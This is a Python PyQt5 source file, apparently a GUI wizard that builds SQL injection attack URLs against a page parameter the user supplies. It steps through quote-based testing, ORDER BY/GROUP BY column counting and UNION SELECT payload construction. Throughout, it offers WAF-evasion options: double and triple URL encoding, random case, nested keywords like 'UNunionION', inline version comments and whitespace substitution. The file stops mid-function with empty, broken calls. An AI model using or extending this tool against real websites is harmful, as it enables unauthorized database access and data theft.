import sys
from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
from modules import *
import layout

def Step0_EnterPressed():
	if layout.url[0].text().rfind("=") == -1 or layout.url[0].text().rfind("?") == -1:
		Error("Error", "취약점이 있는 페이지를 찾아주세요.")
	else:
		layout.wrap[0].hide()
		layout.wrap[1].show()
		layout.slicedUrl[1].setText(layout.url[0].text()[-10 : layout.url[0].text().rfind("=") + 1])
		layout.setting[1][0].setItemText(0, layout.url[0].text()[layout.url[0].text().rfind("=") + 1 : len(layout.url[0].text())])
		layout.url[1].setText(layout.url[0].text() + "'")

def Step1_Setting():
	if layout.select[1][0].currentIndex() == 0:
		layout.setting[1][1].setItemText(0, "'")
		layout.setting[1][1].setItemText(1, '"')
		layout.setting[1][1].setItemText(2, ")")
	elif layout.select[1][0].currentIndex() == 1:
		layout.setting[1][1].setItemText(0, DoubleAscii("'"))
		layout.setting[1][1].setItemText(1, DoubleAscii('"'))
		layout.setting[1][1].setItemText(2, DoubleAscii(")"))
	elif layout.select[1][0].currentIndex() == 2:
		layout.setting[1][1].setItemText(0, TripleAscii("'"))
		layout.setting[1][1].setItemText(1, TripleAscii('"'))
		layout.setting[1][1].setItemText(2, TripleAscii(")"))
	layout.url[1].setText(layout.url[0].text()[0 : layout.url[0].text().rfind("=") + 1] + layout.setting[1][0].currentText() + layout.setting[1][1].currentText())

def Step1_urlSetting():
	layout.url[1].setText(layout.url[0].text()[0 : layout.url[0].text().rfind("=") + 1] + layout.setting[1][0].currentText() + layout.setting[1][1].currentText())

def Step1_Prev():
	layout.wrap[1].hide()
	layout.wrap[0].show()

def Step1_Next():
	layout.popup[1].show()

def Popup1_Next():
	for i in range(0, len(layout.DBselect)):
		if layout.DBselect[i].isChecked() == True:
			layout.popup[1].hide()
			layout.wrap[1].hide()
			layout.wrap[2].show()
			layout.slicedUrl[2].setText(layout.url[1].text()[-10 : len(layout.url[1].text())])
			layout.url[2].setText(layout.url[1].text() + layout.whiteSpace + layout.order + layout.whiteSpace + layout.by + layout.whiteSpace + layout.step2_number.text() + layout.lastComment)
			break
		elif i == len(layout.DBselect) - 1 and layout.DBselect[i].isChecked() == False:
			Error("에러", "선택된 것이 없습니다.")

def Step2_setting():
	layout.url[2].setText(layout.url[1].text() + layout.setting[2][0].currentText() + layout.step2_number.text() + layout.setting[2][1].currentText())

def Step2_select():
	if layout.select[2][0].currentIndex() == 0:
		layout.setting[2][0].setItemText(0, " order by ")
		layout.setting[2][0].setItemText(1, " group by ")
	elif layout.select[2][0].currentIndex() == 1:
		layout.setting[2][0].setItemText(0, " order by ".upper())
		layout.setting[2][0].setItemText(1, " group by ".upper())
	elif layout.select[2][0].currentIndex() == 2:
		layout.setting[2][0].setItemText(0, RandomCase(" order by "))
		layout.setting[2][0].setItemText(1, RandomCase(" group by "))
	elif layout.select[2][0].currentIndex() == 3:
		layout.setting[2][0].setItemText(0, " ORorderDER BbyY ")
		layout.setting[2][0].setItemText(1, " GRgroupOUP BbyY ")

	if layout.select[2][1].currentIndex() == 0:
		if layout.select[2][0].currentIndex() == 0:
			layout.setting[2][0].setItemText(0, " order by ")
			layout.setting[2][0].setItemText(1, " group by ")
	elif layout.select[2][1].currentIndex() == 1:
		layout.setting[2][0].setItemText(0, layout.setting[2][0].itemText(0).replace("o", DoubleAscii("o")).replace("O", DoubleAscii("O")))
		layout.setting[2][0].setItemText(1, layout.setting[2][0].itemText(1).replace("g", DoubleAscii("g")).replace("G", DoubleAscii("G")))
	elif layout.select[2][1].currentIndex() == 2:
		layout.setting[2][0].setItemText(0, layout.setting[2][0].itemText(0).replace("o", TripleAscii("o")).replace("O", TripleAscii("O")))
		layout.setting[2][0].setItemText(1, layout.setting[2][0].itemText(1).replace("g", TripleAscii("g")).replace("G", TripleAscii("G")))
	elif layout.select[2][1].currentIndex() == 3:
		layout.setting[2][0].setItemText(0, DoubleAscii(layout.setting[2][0].itemText(0)).replace("%2520", " "))
		layout.setting[2][0].setItemText(1, DoubleAscii(layout.setting[2][0].itemText(1)).replace("%2520", " "))
	elif layout.select[2][1].currentIndex() == 4:
		layout.setting[2][0].setItemText(0, TripleAscii(layout.setting[2][0].itemText(0)).replace("%252520", " "))
		layout.setting[2][0].setItemText(1, TripleAscii(layout.setting[2][0].itemText(1)).replace("%252520", " "))

	if layout.select[2][2].currentIndex() == 0:
		if layout.select[2][1].currentIndex() == 0:
			if layout.select[2][0].currentIndex() == 0:
				layout.setting[2][0].setItemText(0, " order by ")
				layout.setting[2][0].setItemText(1, " group by ")
	elif layout.select[2][2].currentIndex() == 1:
		layout.setting[2][0].setItemText(0, " " + "/*!" + layout.setting[2][0].itemText(0)[1 : layout.setting[2][0].itemText(0).find(" ", 1)] + "*/" + " " + "/*!" + layout.setting[2][0].itemText(0)[layout.setting[2][0].itemText(0).find(" ", 1) + 1 : layout.setting[2][0].itemText(0).rfind(" ")] + "*/" + " ")
		layout.setting[2][0].setItemText(1, " " + "/*!" + layout.setting[2][0].itemText(1)[1 : layout.setting[2][0].itemText(1).find(" ", 1)] + "*/" + " " + "/*!" + layout.setting[2][0].itemText(1)[layout.setting[2][0].itemText(1).find(" ", 1) + 1 : layout.setting[2][0].itemText(1).rfind(" ")] + "*/" + " ")

	if layout.select[2][3].currentIndex() == 0:
		if layout.select[2][2].currentIndex() == 0:
			if layout.select[2][1].currentIndex() == 0:
				if layout.select[2][0].currentIndex() == 0:
					layout.setting[2][0].setItemText(0, " order by ")
					layout.setting[2][0].setItemText(1, " group by ")
	elif layout.select[2][3].currentIndex() == 1:
		layout.setting[2][0].setItemText(0, layout.setting[2][0].itemText(0).replace(" ", WhiteSpace()))
		layout.setting[2][0].setItemText(1, layout.setting[2][0].itemText(1).replace(" ", WhiteSpace()))
	elif layout.select[2][3].currentIndex() == 2:
		layout.setting[2][0].setItemText(0, layout.setting[2][0].itemText(0).replace(" ", WhiteSpaceDouble()))
		layout.setting[2][0].setItemText(1, layout.setting[2][0].itemText(1).replace(" ", WhiteSpaceDouble()))

	layout.url[2].setText(layout.url[1].text() + layout.setting[2][0].currentText() + layout.step2_number.text() + layout.setting[2][1].currentText())

def Step2_number():
	layout.url[2].setText(layout.url[1].text() + layout.setting[2][0].currentText() + layout.step2_number.text() + layout.setting[2][1].currentText())

def Step2_Prev():
	layout.wrap[2].hide()
	layout.wrap[1].show()

def Step2_Next():
	for i in range(0, len(layout.step2_number.text())):
		if layout.step2_number.text()[i].isdigit() == False:
			Error("에러", "숫자만 입력해주세요.")
			break
		elif i == len(layout.step2_number.text()) - 1 and layout.step2_number.text()[i].isdigit() == True:
			layout.wrap[2].hide()
			layout.wrap[3].show()
			number = ""
			null = ""
			scratch = ""
			for i in range(0, int(layout.step2_number.text())):
				number += str(i + 1)
				null += "null"
				scratch += str(i + 1) + str(i + 1) + str(i + 1) + str(i + 1)
				if i != int(layout.step2_number.text()) - 1:
					number += ","
					null += ","
					scratch += ","
			layout.setting[3][2].addItem(number)
			layout.setting[3][2].addItem(null)
			layout.setting[3][2].addItem(scratch)
			layout.slicedUrl[3].setText(layout.url[1].text()[-10 : layout.url[1].text().rfind("=") + 1])
			layout.slicedUrl2.setText(layout.url[1].text()[layout.url[1].text().rfind("=") + 1 : len(layout.url[1].text())])
			layout.url[3].setText(layout.url[1].text() + " union select " + layout.setting[3][2].currentText() + layout.setting[2][1].currentText())

def Step3_select():
	if layout.select[3][0].currentIndex() == 0:
		layout.setting[3][1].setItemText(0, " union select ")
		layout.setting[3][1].setItemText(1, " union all select ")
	elif layout.select[3][0].currentIndex() == 1:
		layout.setting[3][1].setItemText(0, " union select ".upper())
		layout.setting[3][1].setItemText(1, " union all select ".upper())
	elif layout.select[3][0].currentIndex() == 2:
		layout.setting[3][1].setItemText(0, RandomCase(" union select "))
		layout.setting[3][1].setItemText(1, RandomCase(" union all select "))
	elif layout.select[3][0].currentIndex() == 3:
		layout.setting[3][1].setItemText(0, " UNunionION SELselectECT ")
		layout.setting[3][1].setItemText(1, " UNunionION AallLL SELselectECT ")

	if layout.select[3][1].currentIndex() == 0:
		if layout.select[3][0].currentIndex() == 0:
			layout.setting[3][1].setItemText(0, " union select ")
			layout.setting[3][1].setItemText(1, " union all select ")
	elif layout.select[3][1].currentIndex() == 1:
		layout.setting[3][1].setItemText(0, " " + DoubleAscii("u") + "nion select ")
		layout.setting[3][1].setItemText(1, " " + DoubleAscii("u") + "nion all select ")
	elif layout.select[3][1].currentIndex() == 2:
		layout.setting[3][1].setItemText(0, " " + TripleAscii("u") + "nion select ")
		layout.setting[3][1].setItemText(1, " " + TripleAscii("u") + "nion all select ")
	elif layout.select[3][1].currentIndex() == 3:
		layout.setting[3][1].setItemText(0, DoubleAscii(layout.setting[3][1].itemText(0)).replace("%2520", " "))
		layout.setting[3][1].setItemText(1, DoubleAscii(layout.setting[3][1].itemText(1)).replace("%2520", " "))
	elif layout.select[3][1].currentIndex() == 4:
		layout.setting[3][1].setItemText(0, TripleAscii(layout.setting[3][1].itemText(0)).replace("%252520", " "))
		layout.setting[3][1].setItemText(1, TripleAscii(layout.setting[3][1].itemText(1)).replace("%252520", " "))

	if layout.select[3][2].currentIndex() == 0:
		if layout.select[3][1].currentIndex() == 0:
			if layout.select[3][0].currentIndex() == 0:
				layout.setting[3][1].setItemText(0, " union select ")
				layout.setting[3][1].setItemText(1, " union all select ")
	elif layout.select[3][2].currentIndex() == 1:
		layout.setting[3][1].setItemText(0, )
		layout.setting[3][1].setItemText(1, )
